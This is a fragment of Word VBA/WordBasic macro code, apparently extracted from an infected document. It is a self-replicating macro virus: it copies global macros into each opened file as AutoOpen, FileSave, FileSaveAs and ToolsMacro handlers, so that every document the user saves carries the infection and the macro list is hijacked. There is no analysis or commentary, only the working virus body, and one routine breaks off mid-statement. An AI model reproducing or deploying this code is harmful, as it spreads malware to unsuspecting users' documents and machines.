   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AAAAAC"

   Public Sub MAIN()
   Dim Fname$
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object
   Fname$ = WordBasic.[Left$](WordBasic.[Right$](WordBasic.[FileName$](), 12), 8)
   If (Fname$ = "Document") Or (Fname$ = "Template") Then GoTo Bail
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAB"
   WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAC"
   WordBasic.MacroCopy "Global:FileSave", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAD"
   WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
   Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   On Error GoTo -1: On Error GoTo Done
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
   sTMacro$

   Attribute VB_Name = "AAAAAB"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAB"
   WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAC"
   WordBasic.MacroCopy "Global:FileSave", sTMacro$
   sTMacro$ = sMe$ + ":AAAAAD"
   WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub
